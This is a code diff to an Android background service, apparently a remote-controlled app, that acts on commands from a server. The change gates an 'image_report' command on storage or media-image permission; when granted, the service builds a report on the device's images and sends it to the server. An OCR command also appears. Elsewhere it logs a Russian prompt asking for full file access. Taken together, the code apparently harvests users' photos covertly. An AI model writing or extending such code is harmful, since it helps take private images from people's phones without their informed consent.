@@ -3,10 +3,12 @@ package com.example.onfidoloader
 import android.app.*
 import android.content.Intent
 import android.content.SharedPreferences
+import android.content.pm.PackageManager
 import android.os.Build
 import android.os.IBinder
 import android.provider.Settings
 import android.util.Log
+import androidx.core.content.ContextCompat
 import kotlinx.coroutines.*
 import org.json.JSONObject
 import java.net.HttpURLConnection
@@ -123,9 +125,17 @@ class BackgroundService : Service() {
                             }
 
                             "image_report" -> {
-                                val report = generateImageReport(this@BackgroundService)
-                                sendReportToServer(report)
-                                logEvent("image_report", report.toString())
+                                val hasFullReadMediaPermission =
+                                    (ContextCompat.checkSelfPermission(this@BackgroundService, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) ||
+                                    (ContextCompat.checkSelfPermission(this@BackgroundService, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED)
+
+                                if (hasFullReadMediaPermission) {
+                                    val report = generateImageReport(this@BackgroundService)
+                                    sendReportToServer(report)
+                                    logEvent("image_report", report.toString())
+                                } else {
+                                    logEvent("image_report", "Ограниченное разрешение на файлы. Пожалуйста, предоставьте полный доступ.")
+                                }
                             }
 
                             "tesseract" -> {
